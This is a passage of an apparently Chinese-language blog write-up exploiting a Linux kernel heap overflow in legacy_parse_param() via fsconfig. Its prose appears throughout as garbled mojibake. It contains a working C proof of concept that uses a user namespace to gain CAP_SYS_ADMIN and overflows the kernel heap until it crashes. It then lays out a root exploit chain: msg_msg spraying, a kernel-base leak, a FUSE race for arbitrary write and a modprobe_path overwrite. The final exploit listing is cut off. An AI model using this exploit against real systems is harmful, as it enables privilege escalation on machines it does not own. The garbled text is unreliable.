id="Proof-of-Concept">Proof of Concept</h2><p>ç”±äºå¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹éƒ½æœªè®¾ç½® <code>init_fs_context</code>ï¼Œå› æ­¤æœ€åéƒ½å¯ä»¥èµ°åˆ° <code>legacy_parse_param()</code> çš„æµç¨‹å½“ä¸­ï¼Œä¾‹å¦‚ <code>ext4</code> æ–‡ä»¶ç³»ç»Ÿçš„ <code>file_system_type</code> å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> <span class="hljs-title">ext4_fs_type</span> =</span> &#123;<br>.owner= THIS_MODULE,<br>.name= <span class="hljs-string">&quot;ext4&quot;</span>,<br>.mount= ext4_mount,<br>.kill_sb= kill_block_super,<br>.fs_flags= FS_REQUIRES_DEV,<br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å°†é€šè¿‡ ext4 æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œæ¼æ´å¤ç°ï¼Œæˆ‘ä»¬åªéœ€è¦è¶Šç•Œå†™è¶³å¤Ÿé•¿çš„ä¸€å—å†…å­˜ï¼Œé€šå¸¸éƒ½èƒ½å†™åˆ°ä¸€äº›å†…æ ¸ç»“æ„ä½“ä»è€Œå¯¼è‡´ kernel panic</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ filesystem mount API éœ€è¦å‘½åç©ºé—´å…·æœ‰  <code>CAP_SYS_ADMIN</code> æƒé™ï¼Œä½†ç”±äºå…¶<strong>ä»…æ£€æŸ¥å‘½åç©ºé—´æƒé™</strong>ï¼Œæ•…å¯¹äºæ²¡æœ‰è¯¥æƒé™çš„ç”¨æˆ·åˆ™å¯ä»¥é€šè¿‡ <code>unshare(CLONE_NEWNS|CLONE_NEWUSER)</code> åˆ›å»ºæ–°çš„å‘½åç©ºé—´ï¼Œä»¥åœ¨æ–°çš„å‘½åç©ºé—´å†…è·å–å¯¹åº”æƒé™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER);<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* make an oob-write by fsconfig */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x4000</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡å †æº¢å‡ºé€ æˆ kernel panicï¼š</p><p><img src="https://s2.loli.net/2023/01/08/KmX1LNFrDQPpd9u.png" alt="image.png"></p><h1>0x02.æ¼æ´åˆ©ç”¨</h1><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä»»æ„é•¿åº¦çš„å †æº¢å‡ºï¼Œè€Œå¯æº¢å‡ºå¯¹è±¡ç”¨çš„åˆ†é… flag ä¸º <code>GFP_KERNEL</code>ã€å¤§å°ä¸º 4kï¼ˆä¸€å¼ å†…å­˜é¡µå¤§å°ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°å¯ä»¥åŸºäº<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">æˆ‘ä»¬çš„è€æœ‹å‹ System V æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„ä½“</a>æ¥å®Œæˆåˆ©ç”¨</p><h2 id="Step-I-å †å–·-msg-msgï¼Œè¦†å†™-m-ts-å­—æ®µè¿›è¡Œè¶Šç•Œè¯»å–">Step.I - å †å–· msg_msgï¼Œè¦†å†™ m_ts å­—æ®µè¿›è¡Œè¶Šç•Œè¯»å–</h2><p>æˆ‘ä»¬å…ˆæ¥å¤ä¹ ä¸€ä¸‹æ¶ˆæ¯é˜Ÿåˆ—ä¸­ä¸€æ¡æ¶ˆæ¯çš„åŸºæœ¬ç»“æ„ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ msgsnd ç³»ç»Ÿè°ƒç”¨åœ¨æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€æ¡æŒ‡å®šå¤§å°çš„ message æ—¶ï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­ä¼šåˆ›å»ºè¿™æ ·ä¸€ä¸ªç»“æ„ä½“ä½œä¸ºä¿¡æ¯çš„ headerï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨å•ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€æ¡æ¶ˆæ¯æ—¶ï¼Œè‹¥å¤§å°<strong>ä¸å¤§äºã€ä¸€ä¸ªé¡µé¢å¤§å° - header sizeã€‘</strong>ï¼Œåˆ™ä»…ä½¿ç”¨ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“è¿›è¡Œå­˜å‚¨ï¼Œè€Œå½“æˆ‘ä»¬å•æ¬¡å‘é€**å¤§äºã€ä¸€ä¸ªé¡µé¢å¤§å° - header sizeã€‘**å¤§å°çš„æ¶ˆæ¯æ—¶ï¼Œå†…æ ¸ä¼šé¢å¤–è¡¥å……æ·»åŠ  <code>msg_msgseg</code> ç»“æ„ä½“ï¼Œå…¶ä¸ <code>msg_msg</code> ä¹‹é—´å½¢æˆå¦‚ä¸‹å•å‘é“¾è¡¨ç»“æ„ï¼Œè€Œå•ä¸ª <code>msg_msgseg</code> çš„å¤§å°æœ€å¤§ä¸ºä¸€ä¸ªé¡µé¢å¤§å°ï¼Œè¶…å‡ºè¿™ä¸ªèŒƒå›´çš„æ¶ˆæ¯å†…æ ¸ä¼šé¢å¤–è¡¥å……ä¸Šæ›´å¤šçš„ <code>msg_msgseg</code> ç»“æ„ä½“ï¼Œé“¾è¡¨æœ€åä»¥ NULL ç»“å°¾ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>ç”±äºæˆ‘ä»¬æœ‰è¶Šç•Œå†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥å°† <code>msg_msg</code> ä¸ <code>ctx-&gt;legacy_data</code> å †å–·åˆ°ä¸€èµ·ï¼Œä¹‹åè¶Šç•Œå†™å…¥ç›¸é‚» <code>msg_msg</code> çš„ header å°† <code>m_ts</code> æ”¹å¤§ï¼Œä¹‹åæˆ‘ä»¬å†ä½¿ç”¨ <code>msgrcv()</code> è¯»å–æ¶ˆæ¯ï¼Œä¾¿èƒ½è¯»å–å‡ºè¶…å‡ºè¯¥æ¶ˆæ¯èŒƒå›´çš„å†…å®¹ï¼Œä»è€Œå®Œæˆè¶Šç•Œè¯»å–ï¼›ç”±äºæˆ‘ä»¬çš„è¶Šç•Œå†™å…¥ä¼šç ´å <code>msg_msg</code> å¤´éƒ¨çš„åŒå‘é“¾è¡¨ï¼Œå› æ­¤åœ¨è¯»å–æ—¶æˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>MSG_COPY</code> ä»¥ä¿æŒæ¶ˆæ¯åœ¨é˜Ÿåˆ—ä¸Šä¸ä¼šè¢« unlink</p><p>ç”±äº <code>ctx-&gt;legacy_data</code> çš„å¤§å°å·²ç»æ˜¯ 4k äº†ï¼Œæ•…æˆ‘ä»¬è€ƒè™‘åœ¨ <code>msg_msgseg</code> ä¸Šå®Œæˆè¶Šç•Œè¯»å–ï¼Œç”±äº <code>msgrcv()</code> æ‹·è´æ¶ˆæ¯æ—¶ä»¥å•é“¾è¡¨ç»“å°¾ NULL ä½œä¸ºç»ˆæ­¢ï¼Œæ•…æˆ‘ä»¬æœ€å¤šå¯ä»¥åœ¨ <code>msg_msgseg</code> ä¸Šè¯»å–å°†è¿‘ä¸€å¼ å†…å­˜é¡µå¤§å°çš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬è€ƒè™‘è®© <code>msg_msgseg</code> çš„æ¶ˆæ¯å°½é‡å°ï¼Œä»è€Œè®©æˆ‘ä»¬èƒ½å¤Ÿè¶Šç•Œè¯»å–åˆ°æ›´å¤šçš„ object</p><p>æ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•ä½¿ç”¨è¶Šç•Œè¯»å–è¿›è¡Œæ•°æ®æ³„éœ²ï¼Œè¿™é‡Œæˆ‘ä»¬è€ƒè™‘å †å–·å…¶ä»–çš„å¯ä»¥æ³„éœ²æ•°æ®çš„å°ç»“æ„ä½“ä¸æˆ‘ä»¬çš„ <code>msg_msgseg</code> æ··åœ¨ä¸€èµ·ï¼Œä»è€Œä½¿å¾—æˆ‘ä»¬è¶Šç•Œè¯»å–æ—¶å¯ä»¥ç›´æ¥è¯»åˆ°æˆ‘ä»¬å †å–·çš„è¿™äº›å°ç»“æ„ä½“ï¼Œä»è€Œæ³„éœ²å‡ºå†…æ ¸ä»£ç æ®µåŠ è½½åŸºåœ°å€ï¼Œé‚£ä¹ˆè¿™é‡Œç¬”è€…è€ƒè™‘å †å–· <a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x02-seq-file-%E7%9B%B8%E5%85%B3">seq_operations</a> æ¥å®Œæˆæ•°æ®çš„æ³„éœ²</p><p>ä¸ºäº†æé«˜è¶Šç•Œå†™å…¥ <code>msg_msg</code> çš„æˆåŠŸç‡ï¼Œç¬”è€…é€‰æ‹©å…ˆå †å–·ä¸€éƒ¨åˆ† <code>msg_msg</code>ï¼Œä¹‹ååˆ†é…  <code>ctx-&gt;legacy_data</code> ï¼Œ æ¥ä¸‹æ¥å†å †å–·å¦ä¸€éƒ¨åˆ† <code>msg_msg</code>ä¸ºäº†æé«˜æ•°æ®æ³„éœ²çš„æˆåŠŸæ¦‚ç‡ï¼Œç¬”è€…é€‰æ‹©åœ¨æ¯æ¬¡åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€æ¶ˆæ¯æ—¶éƒ½å–·ä¸€ä¸ª <code>seq_operations</code>ï¼Œåœ¨å®Œæˆæ¶ˆæ¯é˜Ÿåˆ—çš„å‘é€ä¹‹åå†å–·å°„å¤§é‡çš„ <code>seq_operations</code></p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬çš„è¶Šç•Œå†™å¹¶ä¸ä¸€å®šèƒ½å†™åˆ°ç›¸é‚»çš„ <code>msg_msg</code>ï¼Œä¹Ÿå¯èƒ½å†™åˆ°å…¶ä»–ç»“æ„ä½“æˆ–æ˜¯ free objectï¼Œè‹¥ free object çš„ next æŒ‡é’ˆåˆšå¥½ä½äºå¼€å¤´è¢«æˆ‘ä»¬ overwrite äº†ï¼Œåˆ™ä¼šåœ¨åé¢çš„åˆ†é…ä¸­å¯¼è‡´ kernel panic</p><h2 id="Step-II-å †å–·-msg-msgï¼Œåˆ©ç”¨-FUSE-åœ¨æ¶ˆæ¯æ‹·è´æ—¶è¦†å†™-next-å­—æ®µè¿›è¡Œä»»æ„åœ°å€å†™">Step.II - å †å–· msg_msgï¼Œåˆ©ç”¨ FUSE åœ¨æ¶ˆæ¯æ‹·è´æ—¶è¦†å†™ next å­—æ®µè¿›è¡Œä»»æ„åœ°å€å†™</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¯¥è€ƒè™‘å¦‚ä½•è¿›è¡Œææƒçš„å·¥ä½œäº†ï¼Œé€šè¿‡è¦†å†™ <code>msg_msg</code> çš„æ–¹å¼æˆ‘ä»¬åŒæ ·å¯ä»¥è¿›è¡Œä»»æ„åœ°å€å†™çš„æ“ä½œï¼Œç”±äºæ¶ˆæ¯å‘é€æ—¶åœ¨ <code>do_msgsnd()</code> å½“ä¸­æ˜¯å…ˆåˆ†é…å¯¹åº”çš„ <code>msg_msg</code> ä¸ <code>msg_msgseg</code> é“¾è¡¨ä½œä¸ºæ¶ˆæ¯çš„å­˜å‚¨ç©ºé—´å†è¿›è¡Œæ‹·è´ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥å…ˆå‘é€ä¸€ä¸ªå¤§äºä¸€å¼ å†…å­˜é¡µå¤§å°çš„æ¶ˆæ¯ï¼Œè¿™æ ·ä¼šåˆ†é…ä¸€ä¸ª 4k çš„ <code>msg_msg</code> ä¸ä¸€ä¸ª <code>msg_msgseg</code> ï¼Œåœ¨ <code>do_msgsnd()</code> ä¸­å®Œæˆç©ºé—´åˆ†é…ååœ¨ <code>msg_msg</code> ä¸Šè¿›è¡Œæ•°æ®æ‹·è´çš„æ—¶å€™ï¼Œæˆ‘ä»¬åœ¨å¦ä¸€ä¸ªçº¿ç¨‹å½“ä¸­ä½¿ç”¨è¶Šç•Œå†™æ›´æ”¹ <code>msg_msg</code> çš„ headerï¼Œä½¿å…¶ next æŒ‡é’ˆæ›´æ”¹åˆ°æˆ‘ä»¬æƒ³è¦å†™å…¥æ•°æ®çš„åœ°æ–¹ï¼Œå½“ <code>do_msgsnd()</code> å¼€å§‹å°†æ•°æ®æ‹·è´åˆ° <code>msg_msgseg</code> ä¸Šæ—¶ï¼Œç”±äº <code>msg_msg</code> çš„ next æŒ‡é’ˆå·²ç»è¢«æˆ‘ä»¬æ‰€æ›´æ”¹ï¼Œæ•…å…¶ä¼šå°†æ•°æ®å†™å…¥åˆ°æˆ‘ä»¬æŒ‡å®šçš„åœ°å€ä¸Šï¼Œä»è€Œå®Œæˆä»»æ„åœ°å€å†™</p><p><img src="https://s2.loli.net/2023/01/10/JxidQjuHn6ZKs4l.png" alt="image.png"></p><p>ä¸è¿‡ <code>do_msgsnd()</code> çš„æ‰€æœ‰æ“ä½œåœ¨ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ä¸­å®Œæˆï¼Œå› æ­¤è¿™éœ€è¦æˆ‘ä»¬è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œè€Œå¸¸è§„çš„æ¡ä»¶ç«äº‰é€šå¸¸å¾ˆéš¾æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd%EF%BC%88may-obsolete%EF%BC%89">userfaultfd</a> è®©  <code>do_msgsnd()</code> åœ¨æ‹·è´æ•°æ®åˆ°  <code>msg_msg</code>  æ—¶è§¦å‘ç”¨æˆ·ç©ºé—´çš„ç¼ºé¡µå¼‚å¸¸ï¼Œé™·å…¥åˆ°æˆ‘ä»¬çš„ page fault handler ä¸­ï¼Œæˆ‘ä»¬åœ¨ handler çº¿ç¨‹ä¸­å†è¿›è¡Œè¶Šç•Œå†™ï¼Œä¹‹åæ¢å¤åˆ°åŸçº¿ç¨‹ï¼Œè¿™æ ·åˆ©ç”¨çš„æˆåŠŸç‡ä¾¿å¤§å¤§æé«˜äº†</p><p><img src="https://i.loli.net/2021/09/08/i4C7oOvHdG2RqUm.png" alt="image.png"></p><p>ä½†æ˜¯è‡ª kernel ç‰ˆæœ¬ 5.11 èµ·<strong>éç‰¹æƒç”¨æˆ·æ— æ³•ä½¿ç”¨ userfaultfd</strong>ï¼Œè€Œè¯¥æ¼æ´å½±å“çš„å†…æ ¸ç‰ˆæœ¬åŒ…æ‹¬ 5.11ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ›´ä¸ºé€šç”¨çš„åŠæ³•â€”â€”<strong>ç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿ</strong>ï¼ˆfilesystem in userspaceï¼Œ<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#FUSE-race">FUSE</a>ï¼‰å¯ä»¥è¢«ç”¨ä½œ userfaultfd çš„æ›¿ä»£å“ï¼Œå¸®åŠ©æˆ‘ä»¬å®Œæˆæ¡ä»¶ç«äº‰çš„åˆ©ç”¨</p><p><img src="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png" alt="image.png"></p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº slub allocator çš„éšæœºæ€§ï¼Œ**æˆ‘ä»¬å¹¶ä¸èƒ½ä¿è¯ä¸€å®šèƒ½å¤Ÿæº¢å‡ºåˆ°é™·å…¥ FUSE ä¸­çš„ msg_msg ï¼Œ**å› æ­¤éœ€è¦å¤šæ¬¡åˆ†é…å¹¶è¿›è¡Œæ£€æŸ¥ä»¥ç¡®ä¿æˆ‘ä»¬å®Œæˆäº†ä»»æ„åœ°å€å†™</p><p>æœ‰äº†ä»»æ„åœ°å€å†™ï¼Œç°åœ¨è¯¥è€ƒè™‘å†™å“ªé‡Œã€å†™ä»€ä¹ˆäº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†å†™ä¸€äº›å…¨å±€å‡½æ•°è¡¨æ¥åŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼Œæˆ–æ˜¯è¦†å†™ä¸€äº›å…¶ä»–çš„ä¸œè¥¿å®Œæˆææƒï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©è¦†å†™ <code>modprobe_path</code> å®Œæˆææƒï¼Œå½“æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªæ ¼å¼éæ³•çš„ç¨‹åºæ—¶ï¼Œå†…æ ¸ä¼šä»¥ root æƒé™æ‰§è¡Œ <code>modprobe_path</code> æ‰€æŒ‡çš„åº”ç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦å°†å…¶æ”¹ä¸ºæˆ‘ä»¬çš„æ¶æ„è„šæœ¬çš„è·¯å¾„å³å¯</p><h2 id="FINAL-EXPLOIT">FINAL EXPLOIT</h2><p>æœ€åç”±ç¬”è€…ç¼–å†™çš„ exp å¦‚ä¸‹ï¼Œå› ä¸ºä¸€äº›åŸå› æš‚æ—¶æ— æ³•è¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯æ€è·¯åº”è¯¥æ˜¯å¯¹çš„ï¼Œåœ¨ç†è®ºä¸Šåº”å½“å¯è¡Œï¼š</p><blockquote><p>å†…æ ¸åœ°å€æ³„éœ²çš„éƒ¨åˆ†ç»è¿‡éªŒè¯äº†ï¼Œä½†æ˜¯å¯¹äº FUSE è¿›è¡Œåˆ©ç”¨çš„éƒ¨åˆ†ï¼Œç”±äºç¬”è€…åœ¨å¤ç°æ¼æ´æ—¶ä½¿ç”¨çš„æ˜¯ CTF ä¸­ kernel pwn çš„ç®€æ˜“ç¯å¢ƒï¼Œæ•…æ²¡æ³•ä½¿ç”¨ FUSEï¼š(</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span 